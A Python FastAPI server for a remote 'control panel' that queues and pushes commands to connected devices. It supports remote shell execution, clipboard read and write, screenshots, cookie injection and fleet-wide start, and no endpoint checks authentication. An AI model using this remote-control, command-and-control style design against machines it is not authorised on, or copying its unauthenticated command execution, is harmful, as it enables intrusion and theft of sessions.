import asyncio
import base64
import json
import os
import time
from typing import Any

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

from database import db


app = FastAPI(title="AEGIS Web-Control Panel", version="14.0")

if not os.path.exists("static"):
    os.makedirs("static", exist_ok=True)

app.mount("/static", StaticFiles(directory="static"), name="static")


def now_ts() -> int:
    return int(time.time())


class RegisterPayload(BaseModel):
    device_id: str
    name: str


class HeartbeatPayload(BaseModel):
    device_id: str
    ram: float = 0.0
    tcp_count: int = 0
    watchdog_enabled: bool = False


class DeviceLinkPayload(BaseModel):
    link: str


class DeviceCookiePayload(BaseModel):
    cookie: str


class ClipboardWritePayload(BaseModel):
    text: str


class ConsoleInPayload(BaseModel):
    device_id: str
    stream: str = "stdout"
    line: str


class CommandResultPayload(BaseModel):
    device_id: str
    command_id: int
    ok: bool = True
    output: str = ""


class CookieBenchPayload(BaseModel):
    device_id: str
    check_type: str
    ok: bool
    details: str = ""


class WSManager:
    def __init__(self) -> None:
        self.dashboard_clients: set[WebSocket] = set()
        self.device_console_subscribers: dict[str, set[WebSocket]] = {}
        self.device_channels: dict[str, WebSocket] = {}
        self.lock = asyncio.Lock()

    async def add_dashboard(self, ws: WebSocket) -> None:
        await ws.accept()
        async with self.lock:
            self.dashboard_clients.add(ws)

    async def remove_dashboard(self, ws: WebSocket) -> None:
        async with self.lock:
            self.dashboard_clients.discard(ws)

    async def add_console_subscriber(self, device_id: str, ws: WebSocket) -> None:
        await ws.accept()
        async with self.lock:
            self.device_console_subscribers.setdefault(device_id, set()).add(ws)

    async def remove_console_subscriber(self, device_id: str, ws: WebSocket) -> None:
        async with self.lock:
            if device_id in self.device_console_subscribers:
                self.device_console_subscribers[device_id].discard(ws)

    async def set_device_channel(self, device_id: str, ws: WebSocket) -> None:
        await ws.accept()
        async with self.lock:
            self.device_channels[device_id] = ws

    async def remove_device_channel(self, device_id: str, ws: WebSocket) -> None:
        async with self.lock:
            current = self.device_channels.get(device_id)
            if current is ws:
                del self.device_channels[device_id]

    async def broadcast_dashboard(self, payload: dict[str, Any]) -> None:
        dead: list[WebSocket] = []
        async with self.lock:
            targets = list(self.dashboard_clients)
        for ws in targets:
            try:
                await ws.send_json(payload)
            except Exception:
                dead.append(ws)
        if dead:
            async with self.lock:
                for ws in dead:
                    self.dashboard_clients.discard(ws)

    async def push_console_line(self, device_id: str, payload: dict[str, Any]) -> None:
        dead: list[WebSocket] = []
        async with self.lock:
            targets = list(self.device_console_subscribers.get(device_id, set()))
        for ws in targets:
            try:
                await ws.send_json(payload)
            except Exception:
                dead.append(ws)
        if dead:
            async with self.lock:
                for ws in dead:
                    self.device_console_subscribers.get(device_id, set()).discard(ws)

    async def send_to_device_channel(self, device_id: str, payload: dict[str, Any]) -> bool:
        async with self.lock:
            ws = self.device_channels.get(device_id)
        if not ws:
            return False
        try:
            await ws.send_json(payload)
            return True
        except Exception:
            return False


ws_manager = WSManager()


async def emit_devices_snapshot() -> None:
    db.mark_offline_stale(75)
    await ws_manager.broadcast_dashboard({"type": "devices", "items": db.list_devices(), "ts": now_ts()})


@app.on_event("startup")
async def startup() -> None:
    async def stale_loop() -> None:
        while True:
            db.mark_offline_stale(75)
            await emit_devices_snapshot()
            await asyncio.sleep(15)

    asyncio.create_task(stale_loop())


@app.get("/", response_class=HTMLResponse)
async def index(_: Request) -> str:
    with open("static/index.html", "r", encoding="utf-8") as f:
        return f.read()


@app.get("/api/devices")
async def api_devices() -> JSONResponse:
    db.mark_offline_stale(75)
    return JSONResponse({"ok": True, "items": db.list_devices()})


@app.post("/api/node/register")
async def api_node_register(payload: RegisterPayload) -> JSONResponse:
    db.upsert_device(payload.device_id, payload.name)
    await emit_devices_snapshot()
    return JSONResponse({"ok": True})


@app.post("/api/node/heartbeat")
async def api_node_heartbeat(payload: HeartbeatPayload) -> JSONResponse:
    db.upsert_device(payload.device_id, payload.device_id)
    db.update_heartbeat(payload.device_id, payload.ram, payload.tcp_count, "online")
    db.set_watchdog(payload.device_id, payload.watchdog_enabled)
    await emit_devices_snapshot()
    return JSONResponse({"ok": True})


@app.get("/api/node/{device_id}/commands")
async def api_node_commands(device_id: str) -> JSONResponse:
    return JSONResponse({"ok": True, "items": db.list_pending_commands(device_id, 50)})


@app.post("/api/node/command_result")
async def api_node_command_result(payload: CommandResultPayload) -> JSONResponse:
    db.complete_command(payload.command_id)
    if payload.output:
        db.append_console(payload.device_id, "stdout" if payload.ok else "stderr", payload.output)
        await ws_manager.push_console_line(
            payload.device_id,
            {"type": "console", "device_id": payload.device_id, "stream": "stdout" if payload.ok else "stderr", "line": payload.output},
        )
    return JSONResponse({"ok": True})


@app.put("/api/device/{device_id}/link")
async def api_set_link(device_id: str, payload: DeviceLinkPayload) -> JSONResponse:
    db.set_link(device_id, payload.link)
    await emit_devices_snapshot()
    return JSONResponse({"ok": True})


@app.put("/api/device/{device_id}/cookie")
async def api_set_cookie(device_id: str, payload: DeviceCookiePayload) -> JSONResponse:
    db.set_cookie(device_id, payload.cookie)
    await emit_devices_snapshot()
    return JSONResponse({"ok": True})


@app.put("/api/device/{device_id}/watchdog")
async def api_set_watchdog(device_id: str, enabled: bool) -> JSONResponse:
    db.set_watchdog(device_id, enabled)
    cmd_id = db.queue_command(device_id, "set_watchdog", json.dumps({"enabled": enabled}))
    sent = await ws_manager.send_to_device_channel(device_id, {"type": "command", "id": cmd_id, "action": "set_watchdog", "payload": {"enabled": enabled}})
    await emit_devices_snapshot()
    return JSONResponse({"ok": True, "queued": cmd_id, "sent": sent})


@app.post("/api/device/{device_id}/start")
async def api_start(device_id: str) -> JSONResponse:
    device = db.get_device(device_id)
    if not device:
        return JSONResponse({"ok": False, "error": "device_not_found"}, status_code=404)

    if device.get("last_cookie"):
        db.queue_command(device_id, "inject_cookie", json.dumps({"cookie": device.get("last_cookie", "")}))
    cmd_id = db.queue_command(device_id, "start", json.dumps({"link": device.get("saved_link", "")}))
    sent = await ws_manager.send_to_device_channel(device_id, {"type": "command", "id": cmd_id, "action": "start", "payload": {"link": device.get("saved_link", "")}})
    return JSONResponse({"ok": True, "queued": cmd_id, "sent": sent})


@app.post("/api/device/{device_id}/stop")
async def api_stop(device_id: str) -> JSONResponse:
    cmd_id = db.queue_command(device_id, "stop", "{}")
    sent = await ws_manager.send_to_device_channel(device_id, {"type": "command", "id": cmd_id, "action": "stop", "payload": {}})
    return JSONResponse({"ok": True, "queued": cmd_id, "sent": sent})


@app.post("/api/device/start_all")
async def api_start_all() -> JSONResponse:
    items = db.list_devices()
    for item in items:
        if item.get("id"):
            await api_start(item["id"])
    return JSONResponse({"ok": True, "count": len(items)})


@app.post("/api/device/stop_all")
async def api_stop_all() -> JSONResponse:
    items = db.list_devices()
    for item in items:
        if item.get("id"):
            await api_stop(item["id"])
    return JSONResponse({"ok": True, "count": len(items)})


@app.post("/api/device/{device_id}/clipboard/read")
async def api_clipboard_read(device_id: str) -> JSONResponse:
    cmd_id = db.queue_command(device_id, "clipboard_read", "{}")
    sent = await ws_manager.send_to_device_channel(device_id, {"type": "command", "id": cmd_id, "action": "clipboard_read", "payload": {}})
    return JSONResponse({"ok": True, "queued": cmd_id, "sent": sent})


@app.post("/api/device/{device_id}/clipboard/write")
async def api_clipboard_write(device_id: str, payload: ClipboardWritePayload) -> JSONResponse:
    cmd_id = db.queue_command(device_id, "clipboard_write", json.dumps({"text": payload.text}))
    sent = await ws_manager.send_to_device_channel(device_id, {"type": "command", "id": cmd_id, "action": "clipboard_write", "payload": {"text": payload.text}})
    return JSONResponse({"ok": True, "queued": cmd_id, "sent": sent})


@app.post("/api/device/{device_id}/screenshot")
async def api_screenshot(device_id: str) -> JSONResponse:
    cmd_id = db.queue_command(device_id, "screenshot", "{}")
    sent = await ws_manager.send_to_device_channel(device_id, {"type": "command", "id": cmd_id, "action": "screenshot", "payload": {}})
    return JSONResponse({"ok": True, "queued": cmd_id, "sent": sent})


@app.post("/api/node/clipboard_result/{device_id}")
async def api_node_clipboard_result(device_id: str, payload: ClipboardWritePayload) -> JSONResponse:
    db.set_clipboard_text(device_id, payload.text)
    await emit_devices_snapshot()
    return JSONResponse({"ok": True})


@app.post("/api/node/screenshot_result/{device_id}")
async def api_node_screenshot_result(device_id: str, data: dict[str, str]) -> JSONResponse:
    image_b64 = data.get("image_b64", "")
    db.set_screenshot(device_id, image_b64)
    await ws_manager.broadcast_dashboard({"type": "screenshot", "device_id": device_id, "image_b64": image_b64, "ts": now_ts()})
    return JSONResponse({"ok": True})


@app.post("/api/console/in")
async def api_console_in(payload: ConsoleInPayload) -> JSONResponse:
    db.append_console(payload.device_id, payload.stream, payload.line)
    await ws_manager.push_console_line(
        payload.device_id,
        {
            "type": "console",
            "device_id": payload.device_id,
            "stream": payload.stream,
            "line": payload.line,
            "ts": now_ts(),
        },
    )
    return JSONResponse({"ok": True})


@app.post("/api/device/{device_id}/console/exec")
async def api_console_exec(device_id: str, data: dict[str, str]) -> JSONResponse:
    cmd = data.get("cmd", "")
    cmd_id = db.queue_command(device_id, "console_exec", json.dumps({"cmd": cmd}))
    sent = await ws_manager.send_to_device_channel(device_id, {"type": "command", "id": cmd_id, "action": "console_exec", "payload": {"cmd": cmd}})
    return JSONResponse({"ok": True, "queued": cmd_id, "sent": sent})


@app.get("/api/device/{device_id}/console/tail")
async def api_console_tail(device_id: str) -> JSONResponse:
    return JSONResponse({"ok": True, "items": db.get_console_tail(device_id, 300)})


@app.post("/api/testbench/cookie_result")
async def api_testbench_cookie_result(payload: CookieBenchPayload) -> JSONResponse:
    db.add_cookie_test_result(payload.device_id, payload.check_type, payload.ok, payload.details)
    return JSONResponse({"ok": True})


@app.get("/api/testbench/cookie_result/{device_id}")
async def api_testbench_cookie_result_list(device_id: str) -> JSONResponse:
    return JSONResponse({"ok": True, "items": db.get_cookie_test_results(device_id)})


@app.websocket("/ws/dashboard")
async def ws_dashboard(ws: WebSocket) -> None:
    await ws_manager.add_dashboard(ws)
    await ws.send_json({"type": "devices", "items": db.list_devices(), "ts": now_ts()})
    try:
        while True:
            await ws.receive_text()
    except WebSocketDisconnect:
        await ws_manager.remove_dashboard(ws)


@app.websocket("/ws/console/{device_id}")
async def ws_console(device_id: str, ws: WebSocket) -> None:
    await ws_manager.add_console_subscriber(device_id, ws)
    for row in db.get_console_tail(device_id, 200):
        await ws.send_json(
            {
                "type": "console",
                "device_id": device_id,
                "stream": row.get("stream", "stdout"),
                "line": row.get("line", ""),
                "ts": row.get("ts", now_ts()),
            }
        )
    try:
        while True:
            await ws.receive_text()
    except WebSocketDisconnect:
        await ws_manager.remove_console_subscriber(device_id, ws)


@app.websocket("/ws/node/{device_id}")
async def ws_node(device_id: str, ws: WebSocket) -> None:
    await ws_manager.set_device_channel(device_id, ws)
    db.upsert_device(device_id, device_id)
    await emit_devices_snapshot()
    try:
        while True:
            message = await ws.receive_json()
            mtype = message.get("type")
            if mtype == "heartbeat":
                db.update_heartbeat(device_id, float(message.get("ram", 0.0)), int(message.get("tcp_count", 0)), "online")
                if "watchdog_enabled" in message:
                    db.set_watchdog(device_id, bool(message.get("watchdog_enabled")))
                await emit_devices_snapshot()
            elif mtype == "console":
                line = str(message.get("line", ""))
                stream = str(message.get("stream", "stdout"))
                db.append_console(device_id, stream, line)
                await ws_manager.push_console_line(
                    device_id,
                    {"type": "console", "device_id": device_id, "stream": stream, "line": line, "ts": now_ts()},
                )
            elif mtype == "screenshot":
                image_b64 = str(message.get("image_b64", ""))
                db.set_screenshot(device_id, image_b64)
                await ws_manager.broadcast_dashboard({"type": "screenshot", "device_id": device_id, "image_b64": image_b64, "ts": now_ts()})
            elif mtype == "clipboard":
                text = str(message.get("text", ""))
                db.set_clipboard_text(device_id, text)
                await emit_devices_snapshot()
            elif mtype == "command_done":
                cmd_id = int(message.get("id", 0))
                if cmd_id:
                    db.complete_command(cmd_id)
    except WebSocketDisconnect:
        await ws_manager.remove_device_channel(device_id, ws)
        device = db.get_device(device_id)
        if device:
            db.update_heartbeat(device_id, float(device.get("ram", 0)), int(device.get("tcp_count", 0)), "offline")
        await emit_devices_snapshot()


if __name__ == "__main__":
    import uvicorn

    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=False)
